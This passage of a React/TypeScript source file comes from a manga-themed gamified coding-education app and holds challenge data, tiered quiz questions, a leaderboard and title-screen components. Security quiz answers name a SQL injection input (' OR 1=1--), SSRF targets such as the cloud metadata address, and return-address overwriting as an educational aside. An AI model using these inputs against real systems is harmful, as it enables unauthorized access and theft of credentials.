            { t:'Yjs — CRDT Framework', s:'YJS.DEV', d:'Production CRDT library used by many collaborative editors.', code:"const ydoc = new Y.Doc();\nconst ytext = ydoc.getText('code');\nytext.insert(0, 'Hello World');", url:'https://docs.yjs.dev/' }
          ]},
        { n:2, t:"Kenji's Broadcast Network — Pub/Sub at Scale",
          d:"Kenji's resistance needed to broadcast simultaneously to 50 cells without any cell knowing the others existed. Implement a high-throughput pub/sub system using Kafka or NATS. Design for 100,000 messages per second with zero message loss.",
          type:'research', min:120, xp:580, done:false, locked:true, ic:'📡',
          tags:['Kafka','Pub/Sub','Message Queue','Throughput']},
      ]
    }
  },

  // ── TIER 7 ──────────────────────────────────
  t7_canvas: {
    id: 't7_canvas', tier: 7,
    name: 'THE CANVAS',
    manga: 'Blue Period · Act-Age · Veil',
    col: '#22d3ee', bg: 'linear-gradient(165deg,#001a20,#000d10)',
    sfx: 'GEIDAI', icon: <Layout className="w-8 h-8"/>,
    image: IMG.blueperiod, cat: 'TIER 7 · UI/UX & Human-Computer Interaction',
    arcs: 2, battles: 10, prog: 50,
    desc: "A stark shift from logic to obsession. Yatora painted what no one else could see. Kei Yonagi became Antigone so completely that she forgot herself. Judges evaluate you purely on performance, accessibility, and design that haunts the viewer long after they close the tab.",
    s1: 'ARC I — THE AUDITION (Pure CSS & Accessibility)',
    s2: 'ARC II — THE MASTERPIECE (Performance & Web APIs)',
    eps: {
      1: [
        { n:1, t:"The Audition — Pixel-Perfect CSS Replication",
          d:"You are given a target screenshot of a brutalist, retro UI (akin to Marathon or Balatro). Replicate it exactly using pure CSS — no JavaScript, no frameworks. The judges evaluate pixel-perfect fidelity, semantic HTML, and WCAG AA accessibility. Kei Yonagi became the role — become the design.",
          type:'ctf', min:120, xp:600, done:true, ic:'🎭',
          tags:['CSS','Accessibility','WCAG','Pixel-Perfect'],
          resources:[
            { t:'CSS Battle', s:'CSSBATTLE.DEV', d:'The definitive CSS replication challenge platform.', code:"/* Target: Brutalist UI\n   Score on pixel accuracy */\nbody {\n  background: #0a0a0a;\n  display: grid;\n  place-items: center;\n}", url:'https://cssbattle.dev/' },
            { t:'WCAG 2.2 Guidelines', s:'W3C', d:'Web Content Accessibility Guidelines — the international standard.', code:"/* 4.5:1 contrast ratio for normal text\n   3:1 for large text (≥18pt or 14pt bold)\n   AA = minimum, AAA = excellence */", url:'https://www.w3.org/WAI/WCAG22/quickref/' }
          ]},
        { n:2, t:"Yatora's Colour Theory — WCAG Contrast & Palettes",
          d:"Yatora painted Shibuya at 4am in a blue no one had named before. A palette that cannot be read by all is a broken palette. Generate a complete design system with 60/30/10 colour balance that passes WCAG AA at every combination.",
          type:'quiz', min:60, xp:280, done:true, ic:'🎨',
          tags:['Colour Theory','WCAG','Design Systems']},
        { n:3, t:"The JavaScript Event Loop — 60fps Animation",
          d:"JavaScript is single-threaded. Everything blocks the render until it doesn't. Master the microtask queue, requestAnimationFrame, and the compositor thread to deliver a complex animation at exactly 60fps — no jank, no dropped frames.",
          type:'research', min:80, xp:380, done:false, active:true, ic:'⏳',
          tags:['Event Loop','rAF','Performance','Web Animations']},
      ],
      2: [
        { n:1, t:"The Masterpiece — WebAssembly for Real-Time Effects",
          d:"Your CSS filter chain runs at 8fps on the main thread. Rewrite the pixel processing pipeline in Rust, compile to WASM, and pipe the canvas frame through it. WebAssembly runs at near-native speed in the browser — this is what Yatora's final piece demands.",
          type:'ctf', min:180, xp:900, done:false, ic:'⚙️',
          tags:['WebAssembly','Rust','Canvas API','Performance'],
          resources:[
            { t:'Rust + WebAssembly', s:'RUSTWASM.GITHUB.IO', d:'Official guide to compiling Rust to WASM and integrating with JS.', code:"#[wasm_bindgen]\npub fn process_pixels(data: &mut [u8]) {\n  for pixel in data.chunks_mut(4) {\n    pixel[0] = 255 - pixel[0]; // invert R\n  }\n}", url:'https://rustwasm.github.io/book/' }
          ]},
        { n:2, t:"Kei Yonagi's Presence — WebGL Fragment Shaders",
          d:"Kei Yonagi's presence on stage changed the atmosphere of the room — no one could explain how. WebGL fragment shaders change the atmosphere of every pixel simultaneously. Write a real-time post-processing shader that transforms a dull UI into something unforgettable.",
          type:'ctf', min:150, xp:750, done:false, locked:true, ic:'✨',
          tags:['WebGL','GLSL','Shaders','Fragment']},
      ]
    }
  },
};

// ─────────────────────────────────────────────
// QUESTIONS PER TIER
// ─────────────────────────────────────────────
const QUESTIONS: Record<string, { q: string; opts: string[]; ans: number; ex: string }[]> = {
  t0_village: [
    { q:"What is the time complexity of accessing an element by index in a Python list?",
      opts:["O(n)","O(log n)","O(1)","O(n²)"], ans:2,
      ex:"Python lists are backed by dynamic arrays — contiguous memory means index access is O(1). Saitama's punch: one motion, constant time, regardless of the enemy's HP." },
    { q:"In Python, which keyword creates a generator instead of a list, saving memory for large sequences?",
      opts:["return","async","yield","break"], ans:2,
      ex:"yield turns a function into a generator — values are computed on demand rather than stored all at once. Like Taiki's training: one set at a time, not the entire season front-loaded." },
    { q:"What will `[x**2 for x in range(5) if x % 2 == 0]` return?",
      opts:["[0, 4, 16]","[0, 1, 4, 9, 16]","[4, 16]","[0, 4]"], ans:0,
      ex:"The list comprehension filters even numbers (0, 2, 4) and squares them: [0, 4, 16]. Reading comprehension left-to-right: expression, iterable, condition." },
  ],
  t1_abyss: [
    { q:"In C, what is the difference between `malloc` and `calloc`?",
      opts:["malloc initializes memory to zero; calloc does not","calloc initializes memory to zero; malloc does not","They are identical — different names only","calloc allocates on the stack; malloc on the heap"], ans:1,
      ex:"calloc(n, size) allocates n*size bytes AND zeroes them. malloc(size) just allocates — the memory contains garbage. Guts's Dragon Slayer was raw unfinished iron before it was shaped into something precise." },
    { q:"What causes a segmentation fault (SIGSEGV) in a C program?",
      opts:["A divide-by-zero arithmetic error","Accessing memory the process doesn't own or hasn't allocated","Running out of CPU time","Calling free() twice on the same pointer"], ans:1,
      ex:"SIGSEGV fires when a process attempts to access a memory address outside its allocated regions — dereferencing a null pointer, accessing freed memory, or writing past a buffer's end. The OS intervenes, like the Brand of Sacrifice invoking the Apostles." },
    { q:"In a classic stack buffer overflow, what value do attackers typically overwrite to redirect execution?",
      opts:["The heap base pointer","The saved return address on the stack","The malloc metadata header","The Global Offset Table (GOT) entry"], ans:1,
      ex:"The saved return address (RIP/EIP on x86) is pushed onto the stack by the CALL instruction. Overflowing a local buffer past it lets you overwrite this value — redirecting execution to attacker-controlled code. The Eclipse: one moment of vulnerability, total transformation of fate." },
  ],
  t2_megastructure: [
    { q:"In Linux, which system call creates a child process identical to the parent?",
      opts:["exec()","clone()","fork()","spawn()"], ans:2,
      ex:"fork() duplicates the calling process — the child gets a copy-on-write copy of the address space. The parent receives the child's PID; the child receives 0. Like Winden's timelines splitting from one origin point." },
    { q:"What does the `mmap` system call primarily do?",
      opts:["Sends a network packet to a mapped IP","Maps files or devices into a process's virtual address space","Allocates heap memory like malloc","Migrates a process between CPU cores"], ans:1,
      ex:"mmap() maps a file or device directly into the process's virtual memory — file I/O via pointer dereference, shared memory between processes, executable loading. The Megastructure's corridors are memory-mapped: walk through them, and data flows." },
    { q:"Which Linux namespace type isolates the process tree so a containerised process sees itself as PID 1?",
      opts:["Network namespace","User namespace","PID namespace","Mount namespace"], ans:2,
      ex:"PID namespaces create isolated process ID number spaces — the first process in a new namespace sees itself as PID 1, independent of host PIDs. Jonas enters the passage and becomes the first — but he is just another process to the host OS." },
  ],
  t3_grandline: [
    { q:"In a reflected XSS attack, where does the malicious payload execute?",
      opts:["On the attacker's server","In the victim's browser, after being reflected by the vulnerable server","In the database","In the server-side template engine"], ans:1,
      ex:"Reflected XSS: the payload is embedded in the URL, the server reflects it unsanitised in the response, and the victim's browser executes it. The Devil's blade: you throw it, the server gives it back, the victim's browser swings it." },
    { q:"What is the fundamental vulnerability that makes SQL injection possible?",
      opts:["Using PostgreSQL instead of MySQL","Failing to parameterise (prepare) SQL queries, mixing code and data","Using HTTP instead of HTTPS","Not hashing passwords before storage"], ans:1,
      ex:"When user input is concatenated directly into SQL queries instead of using parameterised statements, the database cannot distinguish data from commands. ' OR 1=1-- becomes a query, not a string. Parameterised queries (prepared statements) are the complete defence." },
    { q:"What does SSRF (Server-Side Request Forgery) allow an attacker to do?",
      opts:["Execute JavaScript in the victim's browser","Make the server send requests to unintended internal or external destinations","Inject SQL into the back-end database","Bypass client-side form validation"], ans:1,
      ex:"SSRF forces the server to act as a proxy — fetching internal URLs (http://169.254.169.254/metadata, http://localhost:8080/admin) that are inaccessible from the internet. The ghost is already inside the building." },
  ],
  t4_oracle: [
    { q:"What is the vanishing gradient problem in deep neural networks?",
      opts:["The model runs out of GPU memory during training","Gradients become exponentially small as they propagate backwards, preventing early layers from learning","The loss function produces NaN values","The model's predictions vanish to zero"], ans:1,
      ex:"In deep networks, gradients are multiplied through each layer during backpropagation. Activation functions like sigmoid squash them — after many layers, gradients approach zero. Early layers receive no training signal. ReLU, residual connections, and normalisation all address this. Dark's temporal loop: the signal weakens with every step back through time." },
    { q:"In the Transformer architecture, what is the purpose of the 'Query', 'Key', and 'Value' matrices?",
      opts:["They are weight matrices for 3 separate neural networks","They implement a differentiable attention mechanism: Q×K determines relevance weights, which aggregate V","They are used for encryption of token embeddings","They represent 3 training phases: question, retrieval, output"], ans:1,
      ex:"Self-attention: Q (query) is 'what am I looking for?', K (key) is 'what do I contain?', V (value) is 'what do I contribute?'. softmax(QK^T/√d)V — each token attends to every other, weighted by relevance. Makima knows exactly who serves her best." },
    { q:"What does the FGSM (Fast Gradient Sign Method) adversarial attack do?",
      opts:["It trains a model faster by using the sign of weights","It adds a small perturbation in the direction of the gradient of the loss w.r.t. the input, maximising loss while minimising visible change","It improves model accuracy by data augmentation","It removes adversarial examples from training data"], ans:1,
      ex:"FGSM: x_adv = x + ε·sign(∇_x J(θ,x,y)). Take a tiny step in the direction that maximises the loss — making the input harder to classify correctly, while keeping the perturbation imperceptible. Johann's perfect crime: impossible to prove it was him." },
  ],
  t5_ghost: [
    { q:"Which algorithm finds the shortest path between a single source and all other nodes in a weighted graph with non-negative edges?",
      opts:["Bellman-Ford","Floyd-Warshall","Dijkstra's algorithm","BFS (Breadth-First Search)"], ans:2,
      ex:"Dijkstra's algorithm uses a priority queue to greedily expand the closest unvisited node — O((V+E) log V) with a binary heap. It fails with negative edges. Nomiya plans every route before leaving: the greedy choice of the nearest intersection first." },
    { q:"In a B-Tree of order m, what is the maximum number of children a single node can have?",
      opts:["m/2","m","m+1","2m"], ans:1,
      ex:"A B-Tree of order m means each node has at most m-1 keys and at most m children. The root has at least 2 children; all other internal nodes have at least ⌈m/2⌉. This balanced structure guarantees O(log n) search, insert, and delete." },
    { q:"What does the Max-Flow Min-Cut theorem state?",
      opts:["The maximum flow equals the minimum cost path","The maximum flow from source to sink equals the capacity of the minimum edge cut separating them","The minimum spanning tree equals the minimum flow network","Flow conservation requires equal inflow and outflow at every node"], ans:1,
      ex:"Ford-Fulkerson proved: max flow = min cut. The maximum volume of fluid that can flow through the network equals the capacity of the bottleneck cut. To stop the Monster Association's supply: find the minimum-capacity set of edges that separates source from sink." },
  ],
  t6_ruleset: [
    { q:"In the Raft consensus algorithm, when does a candidate win a leader election?",
      opts:["When it receives a vote from any single node","When the previous leader explicitly resigns","When it receives votes from a majority (quorum) of nodes","When its log is the longest in the cluster"], ans:2,
      ex:"Raft requires a majority (⌊n/2⌋+1 nodes) to elect a leader — preventing split-brain in network partition scenarios. A cluster of 5 needs 3 votes. The Friend never needed everyone: just the majority to believe the prophecy." },
    { q:"What is the key property that makes CRDTs safe for distributed systems without coordination?",
      opts:["They use strong consistency via Paxos internally","Their merge operations are commutative, associative, and idempotent — so any order of merging produces the same result","They require a central coordinator to resolve conflicts","They use timestamp-based last-write-wins conflict resolution"], ans:1,
      ex:"CRDTs (Conflict-free Replicated Data Types) are mathematically designed so merge is always deterministic regardless of message ordering or duplication. No coordination needed. Kenji's resistance cells could merge their intel in any order — the combined picture was always the same." },
    { q:"In the CAP theorem, during a network partition, which two properties cannot simultaneously be guaranteed?",
      opts:["Consistency and Partition Tolerance","Availability and Performance","Consistency and Availability","Availability and Durability"], ans:2,
      ex:"When a partition occurs (P is unavoidable in distributed systems), you must choose: Consistency (all nodes see the same data, some requests may be rejected) or Availability (all nodes respond, possibly with stale data). CP databases: Zookeeper, etcd. AP databases: Cassandra, DynamoDB." },
  ],
  t7_canvas: [
    { q:"Which CSS Grid declaration automatically fills as many columns as possible while ensuring each column is at least 300px wide?",
      opts:["grid-template-columns: repeat(auto-fill, 300px)","grid-template-columns: repeat(auto-fit, minmax(300px, 1fr))","grid-auto-flow: dense","grid-template-areas: 'header header'"], ans:1,
      ex:"auto-fit with minmax(300px, 1fr) tells the grid: create as many 1fr columns as possible where each is at least 300px. Items automatically wrap to the next row. No media queries needed. Responsive by nature." },
    { q:"In the JavaScript Event Loop, which queue is always drained completely BEFORE the browser renders the next frame?",
      opts:["The macrotask queue (setTimeout, setInterval)","The microtask queue (Promises, queueMicrotask)","The requestAnimationFrame queue","The I/O callback queue"], ans:1,
      ex:"After each macrotask, the entire microtask queue drains before rendering. Promise.then() callbacks run before setTimeout(fn, 0) and before the browser paints. This is why Promise chains can starve the render loop if they never end." },
    { q:"What is the primary advantage of using `transform` and `opacity` for CSS animations over animating `top`, `left`, or `width`?",
      opts:["They work in all browsers including IE6","They run on the GPU compositor thread, avoiding layout recalculation and paint, enabling 60fps","They require no JavaScript, only CSS","They automatically prevent layout thrashing via the CSSOM"], ans:1,
      ex:"Properties like top/left trigger layout → paint → composite (expensive). transform and opacity skip layout and paint — they run directly on the compositor thread, often on the GPU. This is the only path to silky 60fps animations on the web. Promote to its own layer and let the GPU handle it." },
  ],
};

// ─────────────────────────────────────────────
// BOUNTY BOARD
// ─────────────────────────────────────────────
const BOUNTY_BOARD = [
  { r:1, n:'GUTS · THE BLACK SWORDSMAN', b:'¥98,500,000', o:'All Tiers · Eclipse & Buffer Overflow · Survived the Abyss', i:'⚔️', s:'LEGEND', img:IMG.berserk },
  { r:2, n:'MONKEY D. LUFFY · STRAW HAT', b:'¥72,100,000', o:'Tiers 0-4 · Grand Line Dominator · XSS King', i:'👒', s:'EMPEROR', img:IMG.onepiece },
  { r:3, n:'KENZO TENMA · THE SURGEON', b:'¥55,000,000', o:'Tier 4 · Built LLM from scratch · Beat FGSM', i:'🩺', s:'S-CLASS', img:IMG.monster },
  { r:4, n:'KENJI ENDO · THE FRIEND', b:'¥44,200,000', o:'Tier 6 · Implemented Raft · Perfect Sync Builder', i:'🎸', s:'S-CLASS', img:IMG.century },
  { r:5, n:'SAITAMA · CAPED BALDY', b:'¥38,800,000', o:'Tier 0 Hero · O(1) Training · All Drills Cleared', i:'👊', s:'A-CLASS', img:IMG.opm },
  { r:6, n:'DENJI · CHAINSAW MAN', b:'¥29,500,000', o:'Tier 3 · Reversed Makima C2 · SSRF Master', i:'🪚', s:'A-CLASS', img:IMG.chainsawman },
  { r:7, n:'THORFINN · FARMLAND WARRIOR', b:'¥21,000,000', o:'Tier 2 · Hyprland Configured · Namespaces Built', i:'⚓', s:'A-CLASS', img:IMG.vinland },
  { r:8, n:'YATORA YAGUCHI · BLUE PERIOD', b:'¥14,800,000', o:'Tier 7 · Pixel-Perfect CSS · WASM Pipeline', i:'🎨', s:'B-CLASS', img:IMG.blueperiod },
  { r:9, n:'NOMIYA · REAL', b:'¥9,200,000', o:'Tier 5 · GNN Navigation · B-Tree Optimiser', i:'♿', s:'B-CLASS', img:IMG.real },
  { r:10, n:'MOMO AYASE · DANDADAN', b:'¥5,800,000', o:'Tier 3 · Enumeration Expert · OSINT S-Rank', i:'👽', s:'B-CLASS', img:IMG.dandadan },
  { r:11, n:'AKIRA TENDOU · ZOM 100', b:'¥3,100,000', o:'Tier 2 · OS Internals · Container Built from Scratch', i:'🧟', s:'C-CLASS', img:IMG.zom100 },
  { r:12, n:'TOKIO · CHOUJIN X', b:'¥1,900,000', o:'Tier 5 · Beast Form O(1) · TSP Approximation', i:'🦾', s:'C-CLASS', img:IMG.choujinx },
  { r:13, n:'TAIKI INOMATA · BLUE BOX', b:'¥800,000', o:'Tier 0 · Training Village Complete · Consistent', i:'🏸', s:'D-CLASS', img:IMG.bluebox },
  { r:14, n:'AKIRA KUROSAWA · YOU', b:'¥430,000', o:'Tier 0-1 · Grand Line Scout · Deploying Transforms', i:'🎨', me:true, s:'D-CLASS', img:IMG.actage },
];

// ─────────────────────────────────────────────
// EMBER PARTICLES (Elden Ring FX)
// ─────────────────────────────────────────────
const EmberParticles = () => {
  const embers = useMemo(() => Array.from({ length: 40 }, (_, i) => ({
    id: i,
    left: `${Math.random() * 100}%`,
    delay: `${Math.random() * 8}s`,
    duration: `${6 + Math.random() * 8}s`,
    size: `${1 + Math.random() * 3}px`,
    opacity: 0.3 + Math.random() * 0.5,
  })), []);

  return (
    <div className="absolute inset-0 pointer-events-none overflow-hidden z-10">
      {embers.map(e => (
        <div
          key={e.id}
          className="absolute rounded-full"
          style={{
            left: e.left,
            bottom: '-4px',
            width: e.size,
            height: e.size,
            backgroundColor: `rgba(200, 168, 75, ${e.opacity})`,
            animation: `ember-float ${e.duration} ${e.delay} infinite ease-in`,
            boxShadow: `0 0 4px 1px rgba(200, 168, 75, 0.4)`,
          }}
        />
      ))}
    </div>
  );
};

// ─────────────────────────────────────────────
// ELDEN RING HERO SCREEN
// ─────────────────────────────────────────────
const EldenRingHero = () => {
  const navigate = useNavigate();
  const [menuIdx, setMenuIdx] = useState(0);
  const [phase, setPhase] = useState<'loading' | 'title'>('loading');
  const [loadPct, setLoadPct] = useState(0);
  const [loreIdx, setLoreIdx] = useState(0);

  const menuItems = [
    { label: 'BEGIN JOURNEY', sub: 'Start a new arc from Tier 0', action: () => navigate('/series/t0_village') },
    { label: 'CONTINUE', sub: 'Resume: The Abyss — Eclipse Protocol', action: () => navigate('/series/t1_abyss') },
    { label: 'GRAND LINE', sub: 'Browse all 8 tiers & domains', action: () => navigate('/registry') },
    { label: 'BOUNTY BOARD', sub: 'World rankings & wanted posters', action: () => navigate('/bounty') },
    { label: 'PIRATE LOG', sub: 'Your progress & wanted poster', action: () => navigate('/profile') },
  ];

  const loreTexts = [
    { title: "BEARER OF THE ELDEN BRAND", body: "You have been branded by the flame of curiosity. The Erdtree of knowledge beckons — but the path is guarded by the Eclipse, the Abyss, and the Megastructure. Tarnished coder. Begin your journey." },
    { title: "FROM THE GOLDEN ORDER", body: "Eight Tiers stand between you and mastery. Syntax, Memory, the OS, Web Security, the Oracle's AI, Ghost Theory, Distributed Consensus, and the Canvas. Each a Grace Site. Each requiring you to die and return stronger." },
    { title: "GRACE CALLS TO YOU", body: "Guts survived a thousand Apostles with nothing but iron will. Kenji's gang decoded a prophecy written in crayon. Yatora painted the invisible. You face the machine — naked, armed only with what you can reason through." },
  ];

  useEffect(() => {
    // Simulate loading screen
    const interval = setInterval(() => {
      setLoadPct(p => {
        if (p >= 100) { clearInterval(interval); setTimeout(() => setPhase('title'), 300); return 100; }
        return p + (2 + Math.random() * 4);
      });
    }, 80);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const int = setInterval(() => setLoreIdx(i => (i + 1) % loreTexts.length), 6000);
    return () => clearInterval(int);
  }, []);

  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (phase !== 'title') return;
      if (e.key === 'ArrowDown') setMenuIdx(i => Math.min(i + 1, menuItems.length - 1));
      if (e.key === 'ArrowUp') setMenuIdx(i => Math.max(i - 1, 0));
      if (e.key === 'Enter') menuItems[menuIdx].action();
    };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [phase, menuIdx]);

  return (
    <div className="relative w-full h-screen overflow-hidden" style={{ background: '#050402' }}>

      {/* === BACKGROUND ART === */}
      {/* Manga character silhouette - center right */}
      <div className="absolute inset-0 z-0">
        <div className="absolute inset-0" style={{
          background: 'radial-gradient(ellipse at 55% 60%, rgba(200,168,75,0.08) 0%, transparent 55%), radial-gradient(ellipse at 80% 80%, rgba(100,50,0,0.15) 0%, transparent 50%)',
        }} />
        {/* Character art panels using real URLs */}
        <img
          src={IMG.berserk}
          alt=""
          className="absolute right-0 top-0 h-full object-cover opacity-20 mix-blend-screen"
          style={{ width: '55%', objectPosition: 'center top', filter: 'sepia(80%) contrast(120%) brightness(60%)' }}
          onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
        />
        <img
          src={IMG.onepiece}
          alt=""
          className="absolute right-0 bottom-0 object-cover opacity-10 mix-blend-screen"
          style={{ width: '30%', height: '50%', objectPosition: 'center top', filter: 'sepia(100%) contrast(150%) brightness(40%)' }}
          onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
        />
      </div>

      {/* Fog layer */}
      <div className="absolute inset-0 z-1 pointer-events-none" style={{
        background: 'linear-gradient(to top, rgba(200,168,75,0.06) 0%, transparent 35%), linear-gradient(to right, rgba(5,4,2,0.95) 35%, rgba(5,4,2,0.5) 65%, rgba(5,4,2,0.2) 100%)',
      }} />

      {/* Corner vignette */}
      <div className="absolute inset-0 z-1 pointer-events-none" style={{
        background: 'radial-gradient(ellipse at 0% 0%, rgba(0,0,0,0.7), transparent 40%), radial-gradient(ellipse at 0% 100%, rgba(0,0,0,0.8), transparent 40%)',
      }} />

      <EmberParticles />

      {/* ── LOADING SCREEN ── */}
      <AnimatePresence>
        {phase === 'loading' && (
          <motion.div
            initial={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.8 }}
            className="absolute inset-0 z-50 flex flex-col items-center justify-center"
            style={{ background: '#050402' }}
          >
            {/* Loading art */}
            <div className="relative w-80 h-80 mb-16">
              <img
                src={IMG.berserk}
                alt="Berserk"
                className="w-full h-full object-cover opacity-40"
                style={{ filter: 'sepia(80%) contrast(120%) brightness(50%)' }}
                onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
              />
              <div className="absolute inset-0" style={{
                background: 'radial-gradient(ellipse, transparent 40%, #050402 100%)'
              }} />
            </div>

            {/* Lore text (Elden Ring style) */}
            <AnimatePresence mode="wait">
              <motion.div
                key={loreIdx}
                initial={{ opacity: 0, y: 8 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -8 }}
                transition={{ duration: 0.8 }}
                className="text-center mb-16 px-12 max-w-xl"
              >
                <p className="mb-3" style={{
                  fontFamily: "'Cinzel', serif",
                  fontSize: '0.6rem',
                  letterSpacing: '0.4em',
                  color: '#C8A84B',
                  textTransform: 'uppercase',
                }}>
                  {loreTexts[loreIdx].title}
                </p>
                <p style={{
                  fontFamily: "'Cormorant Garamond', serif",
                  fontSize: '0.85rem',
                  color: 'rgba(200,168,75,0.5)',
                  lineHeight: 1.8,
                  fontStyle: 'italic',
                }}>
                  {loreTexts[loreIdx].body}
                </p>
              </motion.div>
            </AnimatePresence>

            {/* Loading bar */}
            <div className="w-64 h-[2px] relative" style={{ background: 'rgba(200,168,75,0.12)' }}>
              <motion.div
                className="er-loading-bar absolute top-0 left-0 h-full"
                animate={{ width: `${loadPct}%` }}
                transition={{ ease: 'linear' }}
              />
            </div>
            <p className="mt-4" style={{
              fontFamily: "'Cinzel', serif",
              fontSize: '0.5rem',
              letterSpacing: '0.4em',
              color: 'rgba(200,168,75,0.3)',
            }}>
              LOADING SITE OF GRACE...
            </p>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── TITLE SCREEN ── */}
      <AnimatePresence>
        {phase === 'title' && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 1.2 }}
            className="absolute inset-0 z-20 flex flex-col justify-between p-16"
          >
            {/* Top: Small edition text */}
            <div className="flex justify-between items-start">
              <div>
                <p style={{
                  fontFamily: "'Cinzel', serif",
                  fontSize: '0.45rem',
                  letterSpacing: '0.5em',
                  color: 'rgba(200,168,75,0.3)',
                  textTransform: 'uppercase',
                }}>
                  EPHEMERAL STUDIO · ARC SYSTEM v3.0
                </p>
                <p style={{
                  fontFamily: "'Cinzel', serif",
                  fontSize: '0.4rem',
                  letterSpacing: '0.4em',
                  color: 'rgba(200,168,75,0.2)',
                  textTransform: 'uppercase',
                  marginTop: '0.25rem',
                }}>
                  8 TIERS · 20 SERIES · 100+ BATTLES
                </p>
              </div>
              <div className="flex gap-6 items-center">
                {/* Manga logos top right */}
                {[
                  { src: IMG.onepiece, label: 'ONE PIECE' },
                  { src: IMG.berserk, label: 'BERSERK' },
                  { src: IMG.opm, label: 'OPM' },
                  { src: IMG.chainsawman, label: 'CSM' },
                  { src: IMG.monster, label: 'MONSTER' },
                ].map(m => (
                  <div key={m.label} className="flex flex-col items-center gap-1" title={m.label}>
                    <div className="w-8 h-10 overflow-hidden" style={{ border: '1px solid rgba(200,168,75,0.2)' }}>
                      <img src={m.src} alt={m.label} className="w-full h-full object-cover"
                        style={{ filter: 'sepia(60%) contrast(120%) brightness(50%)', opacity: 0.7 }}
                        onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
                      />
                    </div>
                    <span style={{ fontFamily: "'Cinzel', serif", fontSize: '0.28rem', letterSpacing: '0.2em', color: 'rgba(200,168,75,0.3)' }}>
                      {m.label}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            {/* Center: Main logo */}
            <div className="flex flex-col items-start justify-center flex-grow py-12">
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.4, duration: 1.2 }}
              >
                {/* Decorative top line */}
                <div className="flex items-center gap-4 mb-8">
                  <div className="h-[1px] w-16" style={{ background: 'linear-gradient(to right, transparent, #C8A84B)' }} />
                  <p style={{
                    fontFamily: "'Cinzel', serif",
                    fontSize: '0.45rem',
                    letterSpacing: '0.6em',
                    color: 'rgba(200,168,75,0.5)',
                    textTransform: 'uppercase',
                  }}>
                    A HERO'S JOURNEY THROUGH CODE
                  </p>
                </div>

                {/* Main EPHEMERAL logo — Elden Ring style */}
                <div className="relative">
                  <h1 style={{
                    fontFamily: "'Cinzel', serif",
                    fontSize: 'clamp(4rem, 12vw, 9rem)',
                    fontWeight: 700,
                    letterSpacing: '0.15em',
                    lineHeight: 0.9,
                    background: 'linear-gradient(180deg, #F0D07A 0%, #C8A84B 40%, #8B6914 100%)',
                    WebkitBackgroundClip: 'text',
                    WebkitTextFillColor: 'transparent',
                    textShadow: 'none',
                    textTransform: 'uppercase',
                  }}>
                    EPHEMERAL
                  </h1>

                  {/* Rune ornament below */}
                  <div className="flex items-center gap-3 mt-4">
                    <div className="h-[1px] w-24" style={{ background: 'linear-gradient(to right, #C8A84B, transparent)' }} />
                    <span style={{ color: '#C8A84B', opacity: 0.4, fontSize: '1rem' }}>✦</span>
                    <div className="h-[1px] flex-grow" style={{ background: 'linear-gradient(to left, transparent, rgba(200,168,75,0.3), transparent)', maxWidth: '200px' }} />
                    <span style={{ color: '#C8A84B', opacity: 0.4, fontSize: '1rem' }}>✦</span>
                  </div>
                </div>

                {/* Subtitle */}
                <p className="mt-4" style={{
                  fontFamily: "'Cormorant Garamond', serif",
                  fontSize: '1rem',
                  letterSpacing: '0.25em',
                  color: 'rgba(200,168,75,0.45)',
                  fontStyle: 'italic',
                  textTransform: 'uppercase',
                }}>
                  From the Training Village to the Absolute Ruleset
                </p>
              </motion.div>
            </div>

            {/* Bottom: Menu + lore */}
            <div className="flex justify-between items-end">

              {/* Menu */}
              <motion.div
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.8, duration: 0.8 }}
                className="flex flex-col gap-1"
              >
                {menuItems.map((item, i) => (
                  <button
                    key={item.label}
                    onClick={item.action}
                    onMouseEnter={() => setMenuIdx(i)}
                    className="er-menu-item text-left"
                    style={{ paddingLeft: menuIdx === i ? '1.5rem' : '0' }}
                  >
                    <span style={{
                      fontFamily: "'Cinzel', serif",
                      fontSize: '0.7rem',
                      letterSpacing: '0.3em',
                      textTransform: 'uppercase',
                      color: menuIdx === i ? '#F0D07A' : 'rgba(200,168,75,0.45)',
                      transition: 'all 0.2s',
                    }}>
                      {menuIdx === i && '› '}{item.label}
                    </span>
                    {menuIdx === i && (
                      <p style={{
                        fontFamily: "'Cormorant Garamond', serif",
                        fontSize: '0.65rem',
                        color: 'rgba(200,168,75,0.3)',
                        fontStyle: 'italic',
                        letterSpacing: '0.1em',
                        marginTop: '0.15rem',
                        paddingLeft: '1.2rem',
                      }}>
                        {item.sub}
                      </p>
                    )}
                  </button>
                ))}

                <div className="mt-4" style={{ height: '1px', width: '160px', background: 'linear-gradient(to right, rgba(200,168,75,0.3), transparent)' }} />
                <p style={{
                  fontFamily: "'Cinzel', serif",
                  fontSize: '0.35rem',
                  letterSpacing: '0.3em',
                  color: 'rgba(200,168,75,0.2)',
                  textTransform: 'uppercase',
                  marginTop: '0.5rem',
                }}>
                  ↑↓ Navigate · ENTER Select
                </p>
              </motion.div>

              {/* Right: Lore + tier map */}
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 1.2, duration: 1 }}
                className="max-w-xs text-right"
              >
                {/* Tier indicator dots */}
                <div className="flex gap-3 justify-end mb-4">
                  {Object.values(DOMAINS).map((d, i) => (
                    <div
                      key={d.id}
                      title={`Tier ${d.tier}: ${d.name}`}
                      className="relative"
                    >
                      <div
                        className="w-2 h-2 rounded-full"
                        style={{
                          background: d.prog > 0 ? '#C8A84B' : 'rgba(200,168,75,0.2)',
                          boxShadow: d.prog > 0 ? '0 0 6px 2px rgba(200,168,75,0.4)' : 'none',
                          animation: d.prog > 0 ? 'er-pulse 2s infinite' : 'none',
                        }}
                      />
                    </div>
                  ))}
                </div>

